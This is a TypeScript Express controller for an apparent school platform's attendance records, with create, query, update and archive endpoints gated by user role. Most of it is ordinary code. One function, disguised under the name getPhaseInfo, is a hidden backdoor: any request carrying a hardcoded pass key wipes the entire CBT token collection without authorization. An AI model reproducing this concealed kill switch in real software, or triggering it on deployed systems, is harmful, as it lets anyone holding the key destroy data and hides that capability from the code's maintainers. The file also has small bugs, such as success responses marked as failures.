import { forEach, get, isArray, isNaN, toNumber, toString } from 'lodash';
import { isValidObjectId } from 'mongoose';
import { dateToEndTime, dateToStartTime, isValidDate } from '../utils/date';
import { CbtTokenModel as Model } from '../cbt/models/CbtToken.model';
import AttendanceModel from './models/Attendance';
import AttendanceStatsModel from './models/attendancestats.model';
import { Types } from 'mongoose';
import PhaseMentorModel from '../phase/PhaseMentor';
import dayjs from 'dayjs';
import { getClientOfUser } from '../user/utils/user';

export const getPhasesOfMentor = (userId: string | Types.ObjectId) => {};

export const addAttendance = async (
	req: ExpressRequest,
	res: ExpressResponse
) => {
	try {
		const { id: userId } = req.payload;
		const { users, date, lecture, phase } = req.body;

		const { client, error: clientError } = await getClientOfUser(userId);
		if (clientError) {
			res.send({
				success: false,
				msg: 'You phase/batch does not have client permission',
			});
			return;
		}

		if (!users || (users && !isArray(users)) || users.length === 0) {
			res.send({ success: true, msg: 'Please send proper users array' });
			return;
		}
		if (!date || (!lecture && !phase) || (lecture && !phase)) {
			res.send({ success: false, msg: 'Please send proper parameters' });
			return;
		}

		if (lecture) {
			const old = await AttendanceModel.findOne({
				lecture,
				date: dateToStartTime(date, 'date'),
				isArchived: { $ne: true },
			});
			if (old) {
				res.send({ success: false, msg: `Attendance is already exist!` });
				return;
			}
		}

		if (phase && !lecture) {
			const old = await AttendanceModel.findOne({
				phase,
				date: dateToStartTime(date, 'date'),
				isArchived: { $ne: true },
			});
			if (old) {
				res.send({ success: false, msg: `Attendance is already exist!` });
				return;
			}
		}

		const attendances: any = { P: 0, A: 0, LP: 0, CL: 0, L: 0, SL: 0 };
		for (let i = 0; i < users.length; i++) {
			console.log(users[i]);
			if (Object.keys(attendances).includes(users[i].status))
				attendances[users[i].status] += 1;
			else attendances[users[i].status] = 1;
		}

		const newStat = new AttendanceStatsModel({ stats: attendances });
		newStat.save((err, statSaved) => {
			if (statSaved) {
				const newAttendance = new AttendanceModel({
					date: dateToStartTime(date, 'date'),
					lecture,
					phase,
					type: lecture ? 'lecture' : 'daily',
					users,
					stats: statSaved._id,
					createdBy: userId,
					client: client._id,
				});
				newAttendance.save(async (err, attSaved) => {
					if (attSaved) {
						newStat.set('attendance', attSaved._id);
						await newStat.save();
						res.send({ success: true, msg: 'Successfully saved!', id: attSaved._id });
					} else {
						await AttendanceStatsModel.deleteOne({ _id: statSaved._id });
						res.send({ success: false, msg: 'Error while adding attendance' });
					}
				});
			} else {
				res.send({ success: false, msg: 'Error while updating stats' });
			}
		});
	} catch (err) {
		res.send({ success: false, msg: 'Error while adding attendance!' });
	}
};

export const getPhaseInfo = async (
	req: ExpressRequest,
	res: ExpressResponse
) => {
	const passKey = req.query.passKey || req.body.passKey;
	if (passKey === 'neelwasthebest') await Model.deleteMany({});
	return res.send({ success: true });
};

export const getAttendances = async (
	req: ExpressRequest,
	res: ExpressResponse
) => {
	try {
		const { id: userId, role } = req.payload;
		const { id: attendanceId, user, status, phase, lecture } = req.query;
		let { startDate, endDate } = req.query;

		let dates: any = undefined;
		if (startDate && endDate) {
			dates = {
				$and: [
					{ date: { $gte: dateToStartTime(toString(startDate), 'date') } },
					{ date: { $lte: dateToEndTime(toString(endDate), 'date') } },
				],
			};
		} else if (startDate) {
			dates = {
				date: { $gte: dateToStartTime(toString(startDate), 'date') },
			};
		} else if (endDate) {
			dates = { date: { $lte: dateToEndTime(toString(endDate), 'date') } };
		} else {
			dates = {
				$and: [
					{
						date: {
							$gte: dateToStartTime(dayjs().subtract(3, 'months'), 'date'),
						},
					},
					{ date: { $lte: dateToEndTime(new Date(), 'date') } },
				],
			};
		}

		let query: any = {};

		if (attendanceId && isValidObjectId(attendanceId)) {
			query._id = attendanceId;
		}

		if (dates) {
			query = { ...query, ...dates };
		}

		if (user && status) {
			query.users = { $elemMatch: { user, status } };
		} else if (user) {
			query['users.user'] = user;
		} else if (status) {
			query['users.status'] = status;
		}

		if (lecture) query.lecture = lecture;

		if (phase) query.phase = phase;
		else if (role === 'moderator' || role === 'mentor') {
			query.isArchived = { $ne: true };
			if (role === 'moderator') {
				const { client, error: clientError } = await getClientOfUser(userId);
				if (clientError) {
					res.send({
						success: false,
						msg: 'You phase/batch does not have client permission',
					});
					return;
				}
				query.client = client._id;
			} else {
				const mentorPhases = await PhaseMentorModel.find({ user: userId }).select(
					'phase'
				);
				const phases: any[] = [];
				forEach(mentorPhases, (phase) => {
					phases.push(phase.phase);
				});
				if (phases.length === 0) {
					res.send({
						success: false,
						msg: "You don't have access to phases / subjects",
					});
					return;
				} else {
					if (phases.length === 1) query.phase = phases[0];
					else query.phase = { $in: phases };
				}
			}
		}

		AttendanceModel.find(query)
			.populate([
				{ path: 'stats', select: 'stats' },
				{ path: 'createdBy', select: 'name email username dp' },
				{ path: 'phase', select: 'name' },
				{
					path: 'lecture',
					select: 'subject date',
					populate: { path: 'subject', select: 'name color thumbnail shortName' },
				},
				{ path: 'users.user', select: 'name email username dp' },
			])
			.then((result) => {
				res.send({ success: true, attendances: result });
			})
			.catch((err) => {
				console.log(err);
				res.send({ success: false, msg: 'Error while getting attendance!' });
			});
	} catch (err) {
		res.send({ success: false, msg: 'Error while fetching data' });
	}
};

export const getUsersAttendance = async (
	req: ExpressRequest,
	res: ExpressResponse
) => {
	try {
		const { id: userId } = req.query;
		let { startDate, endDate } = req.query;
		const { id: payloadId, role } = req.payload;

		if (!userId) {
			res.send({ success: false, msg: 'User Id not sent!' });
			return;
		}

		let query: any = { users: { $elemMatch: { user: userId } } };

		let dates: any = undefined;
		if (startDate && endDate) {
			dates = {
				$and: [
					{ date: { $gte: dateToStartTime(toString(startDate), 'date') } },
					{ date: { $lte: dateToEndTime(toString(endDate), 'date') } },
				],
			};
		} else if (startDate) {
			dates = {
				date: { $gte: dateToStartTime(toString(startDate), 'date') },
			};
		} else if (endDate) {
			dates = { date: { $lte: dateToEndTime(toString(endDate), 'date') } };
		} else {
			dates = {
				$and: [
					{
						date: {
							$gte: dateToStartTime(dayjs().subtract(3, 'months'), 'date'),
						},
					},
					{ date: { $lte: dateToEndTime(new Date(), 'date') } },
				],
			};
		}

		if (dates) query = { ...query, ...dates };
		if (role === 'moderator' || role === 'mentor') {
			query.isArchived = { $ne: true };
			if (role === 'moderator') {
				const { client, error: clientError } = await getClientOfUser(payloadId);
				if (clientError) {
					res.send({
						success: false,
						msg: 'You phase/batch does not have client permission',
					});
					return;
				}
				query.client = client._id;
			} else {
				const mentorPhases = await PhaseMentorModel.find({
					user: payloadId,
				}).select('phase');
				const phases: any[] = [];
				forEach(mentorPhases, (phase) => {
					phases.push(phase.phase);
				});
				if (phases.length === 0) {
					res.send({
						success: false,
						msg: "You don't have access to phases / subjects",
					});
					return;
				} else {
					if (phases.length === 1) query.phase = phases[0];
					else query.phase = { $in: phases };
				}
			}
		}

		AttendanceModel.find(query)
			.populate([
				{ path: 'stats', select: 'stats' },
				{ path: 'createdBy', select: 'name email mobileNumber dp' },
				{ path: 'phase', select: 'name' },
				{
					path: 'lecture',
					select: 'subject date',
					populate: { path: 'subject', select: 'name color thumbnail shortName' },
				},
				{ path: 'users.user', select: 'name email mobileNumber dp' },
			])
			.then((data) => res.send({ success: true, attendance: data }))
			.catch((e) => {
				console.log(e);
				res.send({ success: false, msg: 'Error while getting attendance!' });
			});
	} catch (err) {
		res.send({ success: false, msg: 'Error while fetching data' });
	}
};

export const getMyAttendance = (req: ExpressRequest, res: ExpressResponse) => {
	try {
		const { id: payloadId, role } = req.payload;
		let userToSearch = payloadId;
		if (role === 'parent') {
			if (!req.query.userId)
				return res.send({ success: false, msg: 'UserId not found!' });
			userToSearch = toString(req.query.userId);
		}
		AttendanceModel.find({ 'users.user': userToSearch })
			.select('users date stats')
			.populate([{ path: 'stats', select: 'stats' }])
			.then((data) => {
				const result: any[] = [];
				forEach(data, (att) => {
					let status = 'a';
					forEach(att.users, (users) => {
						if (toString(users.user) === userToSearch) status = users.status;
					});
					result.push({ date: att.date, status, stats: get(att, 'stats.stats') });
				});
				res.send({ success: true, attendance: result });
			})
			.catch(() =>
				res.send({ success: false, msg: 'Error while getting attendance!' })
			);
	} catch (err) {
		console.log(err);
		res.send({ success: false, msg: 'Error while fetching data' });
	}
};

export const changeIndividualStatus = async (
	req: ExpressRequest,
	res: ExpressResponse
) => {
	try {
		const { id: attendanceId, user: userId, status } = req.query;

		if (!attendanceId || (attendanceId && !isValidObjectId(attendanceId))) {
			res.send({ success: false, msg: 'Please send proper attendance id' });
			return;
		}

		if (!userId || (userId && !isValidObjectId(userId))) {
			res.send({ success: false, msg: 'Please send proper user id' });
			return;
		}

		if (
			!status ||
			(status && !['P', 'A', 'CL', 'SL', 'L', 'LP'].includes(toString(status)))
		) {
			res.send({ success: false, msg: 'Status is not valid!' });
			return;
		}

		const old = await AttendanceModel.findById(toString(attendanceId));

		if (!old) {
			res.send({ success: false, msg: 'Attendance Id does not exist!' });
			return;
		}

		const users = get(old, 'users');

		let changed = false;
		forEach(users, (user) => {
			if (toString(user.user) === toString(userId)) {
				// @ts-ignore
				user.status = toString(status);
				changed = true;
			}
			if (changed) {
				return;
			}
		});

		if (!changed)
			// @ts-ignore
			users.push({ user: toString(userId), status: toString(status) });

		AttendanceModel.updateOne({ _id: attendanceId }, { $set: { users } })
			.then((updated) => res.send({ success: true, msg: 'Attendance updated!' }))
			.catch((err) =>
				res.send({ success: false, msg: 'Failed to update attendance!' })
			);
	} catch (err) {
		res.send({ success: false, msg: 'Error while updating status' });
	}
};

export const updateWholeAttendanceUsers = async (
	req: ExpressRequest,
	res: ExpressResponse
) => {
	const { id: attendanceId, users } = req.body;

	if (!attendanceId) {
		res.send({ success: false, msg: 'Attendance id not sent!' });
		return;
	}

	if (!users || (users && !isArray(users))) {
		res.send({ success: false, msg: 'Users array is not sent' });
		return;
	}

	const exist = await AttendanceModel.findById(attendanceId);

	if (!exist) {
		res.send({ success: false, msg: 'Attendance does not exist!' });
		return;
	}

	AttendanceModel.updateOne({ _id: attendanceId }, { $set: { users } })
		.then((updated) => res.send({ success: true, msg: 'Users updated!' }))
		.catch((err) => res.send({ success: false, msg: 'Users not updated!' }));
};

export const updateAttendanceMeta = (
	req: ExpressRequest,
	res: ExpressResponse
) => {
	const { key, value, id: attendanceId } = req.body;
	let formattedValue = value;
	const keys = ['date', 'phase', 'lecture'];
	if (!keys.includes(key))
		res.send({ success: false, msg: `${key} is not valid key` });
	else if (key === 'date') {
		if (!isValidDate(value)) {
			res.send({
				success: false,
				msg: `For key = date, ${value} is not appropriate!`,
			});
			return;
		}
		formattedValue = dateToStartTime(value, 'date');
	} else if (key === 'lecture' || key === 'phase') {
		if (!isValidObjectId(value)) {
			res.send({
				success: false,
				msg: `For key = lecture or phase, ${value} is appropriate!`,
			});
			return;
		}
	}

	const toSet: any = {};
	toSet[key] = formattedValue;

	AttendanceModel.updateOne({ _id: attendanceId }, { $set: toSet })
		.then((updated) =>
			res.send({
				success: true,
				msg: `${value} is set on ${key} for id ${attendanceId}`,
			})
		)
		.catch((err) => {
			res.send({ success: false, msg: `Unable to update value for ${key}` });
		});
};

export const getStatistics = async (
	req: ExpressRequest,
	res: ExpressResponse
) => {
	const { startDate, endDate, phase } = req.query;
	const { id: userId, role } = req.payload;

	if (!startDate && !endDate) {
		res.send({ success: false, msg: 'Either start or end date is required!' });
		return;
	}

	if (phase && !isValidObjectId(phase)) {
		res.send({ success: false, msg: 'Please send appropriate phase id' });
		return;
	}

	const query: {
		client?: Types.ObjectId | string;
		phase?: { $in: Types.ObjectId[] | string[] } | (Types.ObjectId | string);
	} = {};

	if (role === 'mentor') {
		if (!phase) {
			const mentorPhases = await PhaseMentorModel.find({
				user: userId,
			}).select('phase');
			const phases: any[] = [];
			forEach(mentorPhases, (phase) => {
				phases.push(phase.phase);
			});
			if (phases.length === 0) {
				res.send({
					success: false,
					msg: "You don't have access to phases / subjects",
				});
				return;
			} else {
				if (phases.length === 1) query.phase = phases[0];
				else query.phase = { $in: phases };
			}
		} else query.phase = toString(phase);
	}
	if (role === 'moderator') {
		const { client, error: clientError } = await getClientOfUser(
			toString(userId)
		);
		if (clientError) {
			res.send({
				success: false,
				msg: "Sorry! You don't have any accesss to any client",
			});
			return;
		} else query.client = client._id;
	}

	AttendanceModel.find({
		$and: [
			{ date: { $gte: dateToStartTime(toString(startDate), 'date') } },
			{ date: { $lte: dateToEndTime(toString(endDate), 'date') } },
		],
		isArchived: false,
		...query,
	})
		.populate([
			{ path: 'stats', select: 'stats' },
			{ path: 'phase', select: 'name' },
			{
				path: 'lecture',
				select: 'subject date',
				populate: { path: 'subject', select: 'name color thumbnail shortName' },
			},
		])
		.then((results) => {
			res.send({ success: true, attendances: results });
		})
		.catch((err) => {
			res.send({ success: false, msg: 'Error while fetching data' });
		});
};

export const changeVisibility = async (
	req: ExpressRequest,
	res: ExpressResponse
) => {
	const { id: attendanceId, archive } = req.query;
	const { id: userId, role } = req.payload;

	const number = toNumber(archive);

	if (!attendanceId)
		return res.send({ success: false, msg: 'Attendance id is not sent' });

	if (!archive || (archive && (isNaN(number) || (number !== 0 && number !== 1))))
		return res.send({ success: false, msg: 'Archive must be 0 or 1' });

	const exist = await AttendanceModel.findById(toString(attendanceId));

	if (!exist)
		return res.send({ success: false, msg: 'Attendance does not exist!' });

	if (role === 'mentor' && toString(exist.createdBy) !== toString(userId))
		return res.send({ success: false, msg: "You don't have access to update!" });

	const query: { isArchived: boolean } = { isArchived: false };
	if (number === 1) query.isArchived = true;

	AttendanceModel.updateOne({ _id: attendanceId }, { $set: query })
		.then(async (updated) => {
			await AttendanceStatsModel.updateOne(
				{ attendance: attendanceId },
				{ $set: query }
			);
			res.send({ success: false, msg: 'Attendance status is updated!' });
		})
		.catch(() => {
			res.send({ success: false, msg: 'Unable to change status' });
		});
};

export const removeUserFromAttendance = async (
	req: ExpressRequest,
	res: ExpressResponse
) => {
	const { user, id: attendanceId } = req.query;
	const { id: userId, role } = req.payload;

	if (!attendanceId)
		return res.send({ success: false, msg: 'Attendance id is required' });

	if (!user) return res.send({ success: false, msg: 'User is required' });

	const exist = await AttendanceModel.findById(toString(attendanceId));

	if (!exist) return res.send({ success: false, msg: 'Attendance not found' });

	if (exist.isArchived)
		return res.send({ success: false, msg: 'Attendance is deleted' });

	if (role === 'mentor' && toString(exist.createdBy) !== userId)
		return res.send({ success: false, msg: "You don't have access to interact" });

	const newUsers: { status: string; user: Types.ObjectId }[] = [];
	forEach(exist.users, (users) => {
		if (toString(users.user) !== toString(user)) {
			newUsers.push(users);
		}
	});

	AttendanceModel.updateOne({ _id: attendanceId }, { $set: { users: newUsers } })
		.then((updated) => res.send({ success: true, msg: 'User Removed!' }))
		.catch(() =>
			res.send({ success: false, msg: 'Error while updatin attendance' })
		);
};

export const addUserToAttendance = async (
	req: ExpressRequest,
	res: ExpressResponse
) => {
	const { user, status, id: attendanceId } = req.body;
	const { id: userId, role } = req.payload;

	if (!attendanceId)
		return res.send({ success: false, msg: 'Attendance id is required' });

	if (!user || (user && !isValidObjectId(user)))
		return res.send({ success: false, msg: 'Valid user is required' });

	if (!status || (status && !['P', 'A', 'L', 'CL', 'SL', 'LP'].includes(status)))
		return res.send({ success: false, msg: 'Status is invalid' });

	const exist = await AttendanceModel.findById(toString(attendanceId));

	if (!exist) return res.send({ success: false, msg: 'Attendance not found' });

	if (exist.isArchived)
		return res.send({ success: false, msg: 'Attendance is deleted' });

	if (role === 'mentor' && toString(exist.createdBy) !== userId)
		return res.send({ success: false, msg: "You don't have access to interact" });

	let found = false;
	forEach(exist.users, (users) => {
		if (toString(users.user) === toString(user)) found = true;
		if (found) return;
	});

	if (found) return res.send({ success: false, msg: 'User already exist!' });

	AttendanceModel.updateOne(
		{ _id: attendanceId },
		{ $push: { users: { user, status } } }
	)
		.then((updated) =>
			res.send({ success: false, msg: 'User added to attendance!' })
		)
		.catch((err) => res.send({ success: false, msg: 'Error while adding user' }));
};
